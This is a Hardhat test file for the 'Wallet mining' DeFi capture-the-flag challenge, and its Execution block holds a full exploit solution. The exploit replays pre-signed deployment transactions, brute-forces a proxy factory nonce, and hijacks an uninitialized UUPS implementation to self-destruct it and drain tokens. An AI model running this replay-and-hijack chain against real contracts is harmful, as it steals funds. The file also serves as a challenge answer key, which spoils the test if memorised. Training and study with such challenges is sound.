const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const inputByteCode = require("../../contracts/player-contracts/inputByteCode.json");
        const GNOSISSAFE_PROXY_FACTORY = await walletDeployer.fact();
        const GNOSISSAFE_MASTER_COPY = await walletDeployer.copy();
        const DEPLOYER_ADDRESS = "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a";
        const EMPTY_HEX = "0x";

        const masterCopyRawTx = {
            input: inputByteCode.masterCopyCreationCode,
            nonce: ethers.utils.hexlify(EMPTY_HEX),
            gasPrice: ethers.utils.arrayify(0x2540be400),
            gasLimit: ethers.utils.arrayify(0x641415),
            to: EMPTY_HEX,
            value:  ethers.utils.hexlify(EMPTY_HEX),
            v: "0x1b",
            r: "0x3b9c79d528fea45d70b72250e15bb1a3cba2081f452fc160689c7b43b48ee8b8",
            s: "0x3fb6ec18167556e950d3cfaea0ebaa5819f8400472ca3296cf818b3351ff955a",
        };

        const setImplementationRawTx = {
            input: inputByteCode.setImplementation,
            nonce: ethers.utils.hexlify("0x01"),
            gasPrice: ethers.utils.arrayify(0x2540be400),
            gasLimit: ethers.utils.arrayify(0xed54),
            to: "0x34f5c67d50d7539b69b743f45b7e24ebbe7202ca",
            value:  ethers.utils.hexlify(EMPTY_HEX),
            v: "0x1c",
            r: "0x7a58ec4bebf8c21afb530ba0392d2b1062493541e54869b92d784e705d8f4bb3",
            s: "0x418746476609b5af2ea61fec10998f54e19d9065449526de11d226149ff74de1",
        };

        const factoryRawTx = {
            input: inputByteCode.factoryCreationCode,
            nonce: ethers.utils.hexlify("0x02"),
            gasPrice: ethers.utils.arrayify(0x2540be400),
            gasLimit: ethers.utils.arrayify(0x114343),
            to: EMPTY_HEX,
            value:  ethers.utils.hexlify(EMPTY_HEX),
            v: "0x1c",
            r: "0xc7841dea9284aeb34c2fb783843910adfdc057a37e92011676fddcc33c712926",
            s: "0x4e59ce12b6a06da8f7ec7c2d734787bd413c284fc3d1be3a70903ebc23945e8c",
        };

        // transfer deployment cost
        await player.sendTransaction({
            to: DEPLOYER_ADDRESS,
            value: ethers.utils.parseEther("1.0"),
        });

        await ethers.provider.sendTransaction(
            ethers.utils.RLP.encode([
                masterCopyRawTx.nonce, 
                masterCopyRawTx.gasPrice, 
                masterCopyRawTx.gasLimit, 
                masterCopyRawTx.to, 
                masterCopyRawTx.value, 
                masterCopyRawTx.input, 
                masterCopyRawTx.v, 
                masterCopyRawTx.r, 
                masterCopyRawTx.s
            ]).toString("hex")
        );

        await ethers.provider.sendTransaction(
            ethers.utils.RLP.encode([
                setImplementationRawTx.nonce, 
                setImplementationRawTx.gasPrice, 
                setImplementationRawTx.gasLimit, 
                setImplementationRawTx.to, 
                setImplementationRawTx.value, 
                setImplementationRawTx.input, 
                setImplementationRawTx.v, 
                setImplementationRawTx.r, 
                setImplementationRawTx.s
            ]).toString("hex")
        );

        await ethers.provider.sendTransaction(
            ethers.utils.RLP.encode([
                factoryRawTx.nonce, 
                factoryRawTx.gasPrice, 
                factoryRawTx.gasLimit, 
                factoryRawTx.to, 
                factoryRawTx.value, 
                factoryRawTx.input, 
                factoryRawTx.v, 
                factoryRawTx.r, 
                factoryRawTx.s
            ]).toString("hex")
        );

        let nonce = 0;
        while (true) {
            const futureAddress = ethers.utils.getContractAddress({
                from: GNOSISSAFE_PROXY_FACTORY,
                nonce
            });
            if(futureAddress.toLowerCase() == DEPOSIT_ADDRESS.toLowerCase()) break;
            nonce++;
        }

        const masterCopyFake = await (await ethers.getContractFactory('MasterCopyAttacker', player)).deploy();
        const walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory')).attach(GNOSISSAFE_PROXY_FACTORY);
        for (let index = 0; index <= nonce; index++) {
            const initializeData = masterCopyFake.interface.encodeFunctionData("initialize", [player.address, token.address]);
            await walletFactory.connect(player).createProxy(masterCopyFake.address, initializeData);  
        }

        const gnosisProxyFake = await (await ethers.getContractFactory('MasterCopyAttacker', player)).attach(DEPOSIT_ADDRESS);
        await gnosisProxyFake.connect(player).takeAll();

        ////// steal remaining 43 ethers  //////
        const implementation = await upgrades.erc1967.getImplementationAddress(authorizer.address);
        const authorizerImpl = await (await ethers.getContractFactory('AuthorizerUpgradeable')).attach(implementation);
        await authorizerImpl.connect(player).init([], []);

        const authorizerAttacker = await (await ethers.getContractFactory('AuthorizerUpgradeableAttacker', player)).deploy();
        await authorizerImpl.connect(player).upgradeToAndCall(authorizerAttacker.address,  authorizerAttacker.interface.encodeFunctionData("destroy"));
        
        for (let index = 0; index < 43; index++) {
            await walletDeployer.connect(player).drop("0x00");
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
